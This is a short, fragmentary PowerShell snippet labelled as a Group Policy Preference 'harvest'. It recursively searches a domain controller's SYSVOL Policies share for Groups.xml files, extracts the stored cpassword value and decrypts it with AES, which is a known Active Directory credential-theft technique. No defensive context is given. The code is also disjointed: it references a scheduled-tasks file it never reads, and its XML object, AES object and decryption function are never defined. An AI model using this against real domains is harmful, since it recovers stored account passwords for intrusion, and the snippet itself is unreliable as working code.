# GPP harvest shape: recursive walk of a SYSVOL Policies share touching
# ScheduledTasks preference data.
$root = '\\DC01\SYSVOL\demo.lab\Policies'
Get-ChildItem -Path $root -Recurse -Include 'Groups.xml'
$task = '\\DC01\SYSVOL\demo.lab\Policies\{GUID}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml'

$Pass = $xml.SelectSingleNode('/Groups/User/Properties/@cpassword').Value
$DecryptedPassword = Get-DecryptedCpassword $Pass
$bytes = [Convert]::FromBase64String($Pass)
$decryptor = $aes.CreateDecryptor()
